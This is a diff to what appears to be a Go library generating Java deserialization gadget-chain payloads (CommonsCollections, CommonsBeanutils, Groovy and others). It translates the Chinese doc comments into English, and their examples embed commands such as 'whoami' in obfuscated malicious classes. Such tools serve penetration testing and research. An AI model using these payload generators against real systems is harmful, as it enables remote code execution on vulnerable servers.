@@ -63,8 +63,8 @@ var AllGadgets = map[string]*GadgetInfo{
 	//BeanShell1GadgetName:              {Name: BeanShell1GadgetName, NameVerbose: "BeanShell1", Help: "", SupportTemplate: false},
 	//Click1GadgetName:                  {Name: Click1GadgetName, NameVerbose: "Click1", Help: "", SupportTemplate: true},
 	//CommonsBeanutils1GadgetName:       {Name: CommonsBeanutils1GadgetName, NameVerbose: "CommonsBeanutils1", Help: "", SupportTemplate: true},
-	//CommonsBeanutils183NOCCGadgetName: {Name: CommonsBeanutils183NOCCGadgetName, NameVerbose: "CommonsBeanutils183NOCC", Help: "使用String.CASE_INSENSITIVE_ORDER作为comparator，去除了cc链的依赖", SupportTemplate: true},
-	//CommonsBeanutils192NOCCGadgetName: {Name: CommonsBeanutils192NOCCGadgetName, NameVerbose: "CommonsBeanutils192NOCC", Help: "使用String.CASE_INSENSITIVE_ORDER作为comparator，去除了cc链的依赖", SupportTemplate: true},
+	//CommonsBeanutils183NOCCGadgetName: {Name: CommonsBeanutils183NOCCGadgetName, NameVerbose: "CommonsBeanutils183NOCC", Help: "uses String.CASE_INSENSITIVE_ORDER as the comparator, removing the dependency on the cc chain.", SupportTemplate: true},
+	//CommonsBeanutils192NOCCGadgetName: {Name: CommonsBeanutils192NOCCGadgetName, NameVerbose: "CommonsBeanutils192NOCC", Help: "uses String.CASE_INSENSITIVE_ORDER as the comparator, removing the dependency on the cc chain.", SupportTemplate: true},
 	//CommonsCollections1GadgetName:     {Name: CommonsCollections1GadgetName, NameVerbose: "CommonsCollections1", Help: "", SupportTemplate: false},
 	//CommonsCollections2GadgetName:     {Name: CommonsCollections2GadgetName, NameVerbose: "CommonsCollections2", Help: "", SupportTemplate: true},
 	//CommonsCollections3GadgetName:     {Name: CommonsCollections3GadgetName, NameVerbose: "CommonsCollections3", Help: "", SupportTemplate: true},
@@ -83,8 +83,8 @@ var AllGadgets = map[string]*GadgetInfo{
 	//JavassistWeld1GadgetName:          {Name: JavassistWeld1GadgetName, NameVerbose: "JavassistWeld1", Help: "", SupportTemplate: true},
 	//Jdk7u21GadgetName:                 {Name: Jdk7u21GadgetName, NameVerbose: "Jdk7u21", Help: "", SupportTemplate: true},
 	//Jdk8u20GadgetName:                 {Name: Jdk8u20GadgetName, NameVerbose: "Jdk8u20", Help: "", SupportTemplate: true},
-	//URLDNS:                            {Name: URLDNS, NameVerbose: URLDNS, Help: "通过URL对象触发dnslog", SupportTemplate: false},
-	//FindGadgetByDNS:                   {Name: FindGadgetByDNS, NameVerbose: FindGadgetByDNS, Help: "通过URLDNS这个gadget探测class,进而判断gadget", SupportTemplate: false},
+	//URLDNS:                            {Name: URLDNS, NameVerbose: URLDNS, Help: "triggers dnslog through URL object", SupportTemplate: false},
+	//FindGadgetByDNS:                   {Name: FindGadgetByDNS, NameVerbose: FindGadgetByDNS, Help: "detects the class through the URLLDNS gadget, and then determines the gadget.", SupportTemplate: false},
 }
 
 func init() {
@@ -192,17 +192,17 @@ func setCommandForRuntimeExecGadget(templ []byte, name string, cmd string) (*Jav
 	return verboseWrapper(obj, AllGadgets[name]), nil
 }
 
-// GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。
-// 此函数使用ParseJavaSerialized方法来解析提供的字节序列，
-// 并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空，
-// 函数将返回错误。如果解析成功，它将返回解析出的第一个Java对象。
-// byt：要解析的字节数组。
-// 返回：成功时返回第一个Java对象及nil错误，失败时返回nil及相应错误。
+// GetJavaObjectFromBytes Parses and returns the first Java object from a byte array.
+// This function uses the ParseJavaSerialized method to parse the provided byte sequence.
+// and expect at least a valid Java object to be parsed out.
+// function will return an error. If the parsing is successful, it returns the first Java object parsed.
+// byt: The byte array to be parsed.
+// returns: the first Java object and nil error are returned on success, and nil and corresponding error are returned on failure.
 // Example:
 // ```
 // raw := "rO0..." // base64 Java serialized object
-// bytes = codec.DecodeBase64(raw)~ // base64解码
-// javaObject, err := yso.GetJavaObjectFromBytes(bytes) // 从字节中解析Java对象
+// bytes = codec.DecodeBase64(raw)~ // base64 decoding
+// javaObject, err := yso.GetJavaObjectFromBytes(bytes) // parses the Java object from the bytes.
 // ```
 func GetJavaObjectFromBytes(byt []byte) (*JavaObject, error) {
 	objs, err := yserx.ParseJavaSerialized(byt)
@@ -216,13 +216,13 @@ func GetJavaObjectFromBytes(byt []byte) (*JavaObject, error) {
 	return verboseWrapper(obj, &GadgetInfo{}), nil
 }
 
-// GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。
-// 它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。
-// cmd：要传入Java对象的命令字符串。
-// 返回：成功时返回修改后的Java对象及nil错误，失败时返回nil及相应错误。
+// GetBeanShell1JavaObject generates and returns a Java object based on the BeanShell1 serialization template.
+// It first parses the predefined BeanShell1 serialization template, and then replaces the preset placeholder with the incoming command string in the first Java object parsed.
+// cmd: The command string to be passed into the Java object.
+// returns: the modified Java object and nil error are returned on success, and nil and corresponding error are returned on failure.
 // Example:
 // ```
-// command := "ls" // 假设的命令字符串
+// command := "ls" // Hypothetical command string
 // javaObject, err := yso.GetBeanShell1JavaObject(command)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
 // hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -248,13 +248,13 @@ func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
 	return verboseWrapper(obj, AllGadgets["BeanShell1"]), nil
 }
 
-// GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
-// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollections1JavaObject generates and returns a Java object based on the Commons Collections 3.1 serialization template.
+// This function accepts a command string as argument and sets the command in the generated Java object.
+// cmd: the command string to be set in the Java object.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
-// command := "ls" // 假设的命令字符串
+// command := "ls" // Hypothetical command string
 // javaObject, err := yso.GetCommonsCollections1JavaObject(command)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
 // hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -264,13 +264,13 @@ func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
 	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections1, "CommonsCollections1", cmd)
 }
 
-// GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。
-// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollections5JavaObject Generates and returns a Java object based on the Commons Collections 2 serialization template.
+// This function accepts a command string as argument and sets the command in the generated Java object.
+// cmd: the command string to be set in the Java object.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
-// command := "ls" // 假设的命令字符串
+// command := "ls" // Hypothetical command string
 // javaObject, _ = yso.GetCommonsCollections5JavaObject(command)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
 // hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -280,13 +280,13 @@ func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
 	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections5, "CommonsCollections5", cmd)
 }
 
-// GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。
-// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollections6JavaObject generates and returns a Java object based on the Commons Collections 6 serialization template.
+// This function accepts a command string as argument and sets the command in the generated Java object.
+// cmd: the command string to be set in the Java object.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
-// command := "ls" // 假设的命令字符串
+// command := "ls" // Hypothetical command string
 // javaObject, _ = yso.GetCommonsCollections6JavaObject(command)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
 // hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -296,13 +296,13 @@ func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
 	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections6, "CommonsCollections6", cmd)
 }
 
-// GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。
-// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollections7JavaObject is based on the Commons Collections 7 sequence. The template generates and returns a Java object.
+// This function accepts a command string as argument and sets the command in the generated Java object.
+// cmd: the command string to be set in the Java object.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
-// command := "ls" // 假设的命令字符串
+// command := "ls" // Hypothetical command string
 // javaObject, _ = yso.GetCommonsCollections7JavaObject(command)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
 // hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -312,13 +312,13 @@ func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
 	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections7, "CommonsCollections7", cmd)
 }
 
-// GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。
-// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollectionsK3JavaObject generates and returns a Java object based on the Commons Collections K3 serialization template.
+// This function accepts a command string as argument and sets the command in the generated Java object.
+// cmd: the command string to be set in the Java object.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
-// command := "ls" // 假设的命令字符串
+// command := "ls" // Hypothetical command string
 // javaObject, _ = yso.GetCommonsCollectionsK3JavaObject(command)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
 // hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -328,13 +328,13 @@ func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
 	return setCommandForRuntimeExecGadget(template_ser_CommonsCollectionsK3, "CommonsCollectionsK3", cmd)
 }
 
-// GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。
-// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollectionsK4JavaObject Generates and returns a Java object based on the Commons Collections K4 serialized template.
+// This function accepts a command string as argument and sets the command in the generated Java object.
+// cmd: the command string to be set in the Java object.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
-// command := "ls" // 假设的命令字符串
+// command := "ls" // Hypothetical command string
 // javaObject, _ = yso.GetCommonsCollectionsK4JavaObject(command)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
 // hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -344,13 +344,13 @@ func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
 	return setCommandForRuntimeExecGadget(template_ser_CommonsCollectionsK4, "CommonsCollectionsK4", cmd)
 }
 
-// GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。
-// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
-// cmd：要设置在Java对象中的命令字符串。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetGroovy1JavaObject generates and returns a Java object based on the Groovy1 serialization template.
+// This function accepts a command string as argument and sets the command in the generated Java object.
+// cmd: the command string to be set in the Java object.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
-// command := "ls" // 假设的命令字符串
+// command := "ls" // Hypothetical command string
 // javaObject, _ = yso.GetGroovy1JavaObject(command)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
 // hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -360,11 +360,11 @@ func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
 	return setCommandForRuntimeExecGadget(template_ser_Groovy1, "Groovy1", cmd)
 }
 
-// GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。
-// 用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数允许用户定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetClick1JavaObject generates and returns a Java object based on the Click1 serialization template.
+// Users can provide additional configuration via variadic options , which are specified using functions of type GenClassOptionFun.
+// These functions allow the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
@@ -381,20 +381,20 @@ func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 	return ConfigJavaObject(template_ser_Click1, "Click1", options...)
 }
 
-// GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsBeanutils1JavaObject generates and returns a Java object based on the Commons Beanutils 1 serialization template.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(
 //
-//	 yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	 yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //		yso.obfuscationClassConstantPool(),
-//		yso.evilClassName(className), // 指定恶意类的名称
+//		yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -402,21 +402,21 @@ func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, 
 	return ConfigJavaObject(template_ser_CommonsBeanutils1, "CommonsBeanutils1", options...)
 }
 
-// GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。
-// 去除了对 commons-collections:3.1 的依赖。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsBeanutils183NOCCJavaObject generates and returns a Java object based on the Commons Beanutils 1.8.3 serialization template.
+// removes dependency on commons-collections:3.1 if parsing fails or results are empty.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -424,21 +424,21 @@ func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaOb
 	return ConfigJavaObject(template_ser_CommonsBeanutils183NOCC, "CommonsBeanutils183NOCC", options...)
 }
 
-// GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。
-// 去除了对 commons-collections:3.1 的依赖。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsBeanutils192NOCCJavaObject generates and returns a Java object based on the Commons Beanutils 1.9.2 serialization template.
+// removes dependency on commons-collections:3.1 if parsing fails or results are empty.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -446,20 +446,20 @@ func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaOb
 	return ConfigJavaObject(template_ser_CommonsBeanutils192NOCC, "CommonsBeanutils192NOCC", options...)
 }
 
-// GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollections2JavaObject generates and returns a Java object based on the Commons Collections 4.0 serialization template.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetCommonsCollections2JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -467,20 +467,20 @@ func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject
 	return ConfigJavaObject(template_ser_CommonsCollections2, "CommonsCollections2", options...)
 }
 
-// GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollections3JavaObject generates and returns a Java object based on the Commons Collections 3.1 serialization template.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetCommonsCollections3JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -488,20 +488,20 @@ func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject
 	return ConfigJavaObject(template_ser_CommonsCollections3, "CommonsCollections3", options...)
 }
 
-// GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollections4JavaObject generates and returns a Java object based on the Commons Collections 4.0 serialization template.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetCommonsCollections4JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -509,20 +509,20 @@ func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject
 	return ConfigJavaObject(template_ser_CommonsCollections4, "CommonsCollections4", options...)
 }
 
-// GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollections8JavaObject generates and returns a Java object based on the Commons Collections 4.0 serialization template.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetCommonsCollections8JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -530,20 +530,20 @@ func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject
 	return ConfigJavaObject(template_ser_CommonsCollections8, "CommonsCollections8", options...)
 }
 
-// GetCommonsCollectionsK1JavaObject 基于Commons Collections <=3.2.1 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollectionsK1JavaObject Based on Commons Collections <=3.2.1 The serialization template generates and returns a Java object.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -551,20 +551,20 @@ func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObjec
 	return ConfigJavaObject(template_ser_CommonsCollectionsK1, "CommonsCollectionsK1", options...)
 }
 
-// GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetCommonsCollectionsK2JavaObject Generates and returns a Java object based on the Commons Collections 4.0 serialization template.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -572,20 +572,20 @@ func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObjec
 	return ConfigJavaObject(template_ser_CommonsCollectionsK2, "CommonsCollectionsK2", options...)
 }
 
-// GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetJBossInterceptors1JavaObject generates and returns a Java object based on the JBossInterceptors1 serialization template.
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetJBossInterceptors1JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -593,20 +593,20 @@ func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject,
 	return ConfigJavaObject(template_ser_JBossInterceptors1, "JBossInterceptors1", options...)
 }
 
-// GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
-// options：用于配置Java对象的可变参数函数列表。
-// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
+// GetJSON1JavaObject generates and returns a Java object based on the JSON1 serialization template. The
+// Through the variadic `options`, the user can provide additional configurations, which are specified using functions of type GenClassOptionFun.
+// These functions enable the user to customize specific properties or behavior of the generated Java objects.
+// options: A list of variable parameter functions used to configure Java objects.
+// Return: Returns the generated Java object and nil error when successful, returns nil and corresponding error when failed.
 // Example:
 // ```
 // command = "whoami"
 // className = "KEsBXTRS"
 // gadgetObj,err = yso.GetJSON1JavaObject(
 //
-//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
+//	yso.useRuntimeExecEvilClass(command), // Use the Runtime Exec method to execute the command
 //	yso.obfuscationClassConstantPool(),
-//	yso.evilClassName(className), // 指定恶意类的名称
+//	yso.evilClassName(className), // Specifies the name of the malicious class
 //
 // )
 // ```
@@ -614,20 +614,20 @@ func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 	return ConfigJavaObject(template_ser_JSON1, "JSON1", options...)
 }
 
-// GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。
-// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
-// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
